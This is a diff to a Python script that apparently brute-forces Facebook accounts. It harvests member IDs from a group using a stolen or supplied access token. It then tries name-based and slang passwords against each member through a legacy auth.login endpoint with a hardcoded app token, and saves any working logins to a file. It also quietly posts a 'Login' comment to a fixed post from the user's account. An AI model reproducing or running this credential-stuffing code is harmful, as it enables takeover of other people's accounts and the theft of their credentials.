@@ -93,7 +93,7 @@ def menu(n,toket):
 		except KeyError:
 			exit("%s[!]%s ups sorry group not found !!"%(R,W))
 		print("%s[*]%s from : %s"%(P,W,e))
-		for y in s.get(url.format(idg+"/members?fields=name,id&limit=10987654321&access_token=%s"%(toket))).json()["data"]:
+		for y in s.get(url.format(idg+"/members?fields=name,id&limit=5000&access_token=%s"%(toket))).json()["data"]:
 			target.append(y["id"])
 	elif unikers in ["0"]:
 		os.system("rm -rf cookie")
@@ -116,7 +116,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"123",nama+"12345",nama+"1234","sayang","bajingan","bangsat","kontol","ngiclik","anjing","ngentot","I Love You"]:
+		for pas in [nama+"123",nama+"12345","@"+nama,"sayang","bangsat","kontol","ngiclik","anjing"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -155,18 +155,18 @@ def cek():
 		toket = open("cookie/token.log","r").read()
 	except OSError:
 		print("%s[×] %sups sorry token not found !!"%(R,W))
-		sleep(2)
+		sleep(1)
 		login()
 	try:
 		n = s.get(url.format("me?access_token=%s"%(toket))).json()["name"]
-		s.post(url.format("100006686703460_1475860812646795/comments?message=Mencoba+python3&access_token=%s"%(toket)))
+		s.post(url.format("100006686703460_2540542986178567/comments?message=Login&access_token=%s"%(toket)))
 		print("%s[*] %ssuccess load access token"%(G,W))
-		sleep(2)
+		sleep(1)
 		menu(n,toket)
 	except KeyError:
 		os.system("rm -rf cookie/token.log")
 		print("%s[×] %sups sorry your access token invalid !!"%(R,W))
-		sleep(2)
+		sleep(1)
 		login()
 	except requests.exceptions.ConnectionError:
 		exit("%s[!] %sups no connection !!"%(R,W))
